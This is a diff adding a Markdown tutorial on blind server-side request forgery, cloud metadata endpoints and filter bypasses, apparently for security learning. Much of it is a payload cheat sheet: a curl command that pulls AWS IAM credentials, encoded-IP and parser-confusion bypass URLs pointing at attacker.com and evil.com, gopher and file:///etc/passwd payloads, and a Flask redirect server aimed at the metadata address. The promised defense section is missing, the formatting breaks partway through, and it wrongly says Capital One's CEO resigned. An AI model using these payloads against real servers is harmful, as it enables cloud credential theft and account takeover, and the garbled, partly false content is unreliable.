@@ -1,0 +1,268 @@
+# Blind SSRF: Deep Dive, Filter Bypasses & Metadata Exploitation
+
+> Understanding why internal metadata endpoints are the most dangerous SSRF targets.
+
+## Table of Contents
+
+- [What is Blind SSRF?](#what-is-blind-ssrf)
+- [Why Blind SSRF is Dangerous](#why-blind-ssrf-is-dangerous)
+- [Metadata Endpoints: The Crown Jewel](#metadata-endpoints-the-crown-jewel)
+- [Filter Bypass Techniques](#filter-bypass-techniques)
+- [Real-World SSRF Exploits](#real-world-ssrf-exploits)
+- [Advanced Detection & Exploitation](#advanced-detection--exploitation)
+- [Defense & Mitigation](#defense--mitigation)
+
+---
+
+## What is Blind SSRF?
+
+### The Core Concept
+
+**Server-Side Request Forgery (SSRF)** occurs when an attacker can induce a server to make HTTP requests to arbitrary URLs.
+
+**Blind SSRF** = You cannot see the response directly, but you can infer information through:
+- Response timing (time-based)
+- Error messages
+- Out-of-band interactions (DNS/HTTP callbacks)
+- Side-channel effects
+
+### Blind vs. Non-Blind SSRF
+
+| Type | Response Visibility | Exploitation Difficulty | Information Leakage |
+|------|--------------------|------------------------|---------------------|
+| **Non-Blind SSRF** | Full response visible | Easy | Complete |
+| **Blind SSRF** | No direct response | Hard | Limited, but still critical |
+
+### How Blind SSRF Works
+
+```mermaid
+graph LR
+    A[Attacker] -->|Malicious URL| B[Vulnerable Server]
+    B -->|Internal Request| C[Internal Service]
+    C -->|Response| B
+    B -->|No response shown| A
+    A -->|Infers from timing/errors| D[Information]
+
+Why Blind SSRF is Dangerous
+The Attack Surface
+
+Even without seeing responses, attackers can:
+
+    Port Scan Internal Networks - Map internal infrastructure
+
+    Identify Running Services - By response patterns/timing
+
+    Trigger Internal Actions - REST APIs, admin functions
+
+    Access Metadata Endpoints - Cloud credentials (MOST CRITICAL)
+
+    Perform Internal Reconnaissance - Hostnames, services
+
+Real Impact Examples
+Impact	Severity	Real-World Example
+Cloud credentials leak	Critical	AWS Metadata API → Full account takeover
+Internal API manipulation	High	Trigger internal admin actions
+Network mapping	Medium	Map internal infrastructure
+Denial of Service	Medium	Crash internal services
+Metadata Endpoints: The Crown Jewel
+Why Metadata Endpoints Are Extremely Dangerous
+
+Metadata endpoints are internal APIs exposed by cloud providers to VMs, containing:
+
+    IAM credentials (can control entire cloud account)
+
+    SSH keys (direct server access)
+
+    User data (startup scripts, secrets)
+
+    Network configuration (internal topology)
+
+Cloud Provider Metadata Endpoints
+Provider	Endpoint	Critical Data
+AWS	http://169.254.169.254/latest/meta-data/	IAM roles, user-data, SSH keys
+GCP	http://metadata.google.internal/computeMetadata/v1/	Service accounts, access tokens
+Azure	http://169.254.169.254/metadata/instance?api-version=2017-08-01	Managed identity credentials
+Alibaba	http://100.100.100.200/latest/meta-data/	RAM role credentials
+DigitalOcean	http://169.254.169.254/metadata/v1/	Droplet metadata
+Kubernetes	https://kubernetes.default.svc/	Service account tokens
+AWS Metadata Deep Dive
+bash
+
+# Base endpoint
+http://169.254.169.254/latest/meta-data/
+
+# Critical paths
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/dynamic/instance-identity/document/
+
+# Example: Getting IAM credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
+
+# Response contains:
+{
+  "Code" : "Success",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIA...",
+  "SecretAccessKey" : "...",
+  "Token" : "...",
+  "Expiration" : "2024-12-31T23:59:59Z"
+}
+
+Why These Endpoints Are So Dangerous
+
+1. No Authentication Required
+bash
+
+# Anyone on the VM can access metadata
+curl http://169.254.169.254/latest/meta-data/
+# Works without any credentials!
+
+2. Permanent Until Rotated
+
+    IAM credentials last 6 hours minimum
+
+    Some tokens last 12+ hours
+
+    User-data persists forever
+
+3. Privilege Escalation
+
+    Metadata often has high-privilege IAM roles
+
+    Can control entire AWS account
+
+    Access to all resources (S3, EC2, RDS, Lambda)
+
+4. Chain Reaction
+text
+
+SSRF → Metadata → IAM Keys → Full Cloud Account Takeover
+
+Real-World Catastrophic Impact
+
+Capital One Breach (2019)
+
+    Vector: SSRF on misconfigured WAF
+
+    Accessed: AWS metadata endpoint
+
+    Stolen: 100M customer records
+
+    Impact: $80M fine, CEO resignation
+
+
+Filter Bypass Techniques
+Common SSRF Filters and Bypasses
+1. IP Address Restrictions
+
+Filter: Blocks 127.0.0.1, 169.254.169.254
+
+Bypasses:
+python
+
+# Decimal conversion
+http://2130706433/  # 127.0.0.1
+http://2852039166/  # 169.254.169.254
+
+# Hexadecimal
+http://0x7f000001/  # 127.0.0.1
+http://0xa9fea9fe/  # 169.254.169.254
+
+# Octal
+http://0177.0.0.01/  # 127.0.0.1
+
+# Mixed encoding
+http://127.0.0.1.nip.io/  # DNS resolves to 127.0.0.1
+http://169.254.169.254.nip.io/
+
+# IPv6 variants
+http://[::1]/  # localhost
+http://[::ffff:7f00:0001]/  # IPv4-mapped IPv6
+http://[0:0:0:0:0:ffff:7f00:0001]/
+
+# URL encoding
+http://127.0.0.1/%2e%2e/%2e%2e/google.com
+
+2. Domain-Based Filters
+
+Filter: Blocks localhost, metadata, internal
+
+Bypasses:
+bash
+
+# DNS rebinding
+http://1.0.0.127.rbndr.us/  # Resolves to 127.0.0.1 after first lookup
+
+# Subdomain tricks
+http://localhost@attacker.com/  # Some parsers ignore @
+http://attacker.com#@127.0.0.1/
+
+# Redirects
+http://attacker.com/redirect-to-internal  # 302 to metadata
+
+# Enclosed alphanumerics
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ/  # Unicode domains
+
+3. Protocol Restrictions
+
+Filter: Only allows http:// or https://
+
+Bypasses:
+bash
+
+# Other protocols that make requests
+file:///etc/passwd
+gopher://internal-service:8080/_POST%20/path%20HTTP/1.0
+dict://localhost:11211/  # Memcached
+ftp://internal-service:21/
+jar:http://example.com/file.jar!/
+
+4. Path-Based Filters
+
+Filter: Checks URL doesn't contain 169.254
+
+Bypasses:
+bash
+
+# Redirect-based
+http://169.254.169.254/ → Redirect to metadata
+
+# Different path
+http://169.254.254.254/  # Wrong IP
+http://metadata.google.internal/  # Different domain
+
+# DNS wildcards
+http://169.254.169.254.xip.io/
+
+
+
+
+
+Advanced Bypass Techniques
+Technique 1: HTTP Redirect Abuse
+python
+
+# Attacker-controlled redirect server
+from flask import Flask, redirect
+
+app = Flask(__name__)
+
+@app.route('/redirect')
+def redirect_to_metadata():
+    return redirect('http://169.254.169.254/latest/meta-data/', code=302)
+
+# If server follows redirects → SSRF
+
+Technique 2: URL Parsing Inconsistencies
+python
+
+# Different parsers interpret URLs differently
+bypasses = [
+    "http://127.0.0.1@evil.com/",  # Some parsers use evil.com, some 127.0.0.1
+    "http://evil.com\\@127.0.0.1",  # Backslash confusion
+    "http://127.0.0.1:80@evil.com:80/",  # Port confusion
+    "http://evil.com#@127.0.0.1/",  # Fragment confusion
+    "http://127.0.0.1:evil.com/",  # Colon confusion
+]
